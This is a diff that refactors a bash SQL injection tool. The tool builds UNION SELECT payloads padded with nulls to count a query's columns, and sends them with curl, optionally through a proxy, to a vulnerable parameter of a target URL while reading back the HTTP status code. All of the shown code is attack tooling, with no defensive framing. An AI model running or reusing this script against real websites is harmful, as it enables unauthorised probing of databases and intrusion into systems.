@@ -13,22 +13,24 @@ COLOR_RED="\033[31m"
 COLOR_GREEN="\033[32m"
 COLOR_RESET="\033[0m"
 
-usage() {
+function usage() {
     echo "usage: ./$(basename $0) -u URL -p PROXY-URL -v VULN-PARAM" 1>&2
 }
 
-exit_failure() {
+function exit_failure() {
     usage
     exit $FAILURE
 }
 
-make_request() {
-    payload="$1"
+function make_request() {
+    local payload="$1"
+    
+    local p=""
     if [ -n "$proxy" ]; then
         p="--proxy $proxy"
     fi
     
-    code=$(
+    local code=$(
         curl $p --get --data-urlencode "$payload" -ski $url | 
         grep HTTP | 
         perl -pe 's/HTTP\/\d(\.\d)?\s(\d{3}).*/$2/g'| 
@@ -42,10 +44,10 @@ make_request() {
     fi
 }
 
-generate_payload() {
-    count=$1
-    ((count=count-1))
-    nulls=$( printf "%${count}s")
+function generate_payload() {
+    local count=$1
+    (( count-- ))
+    local nulls=$( printf "%${count}s")
     nulls=${nulls// /", null"}
     echo "' union select null$nulls -- -"
 }
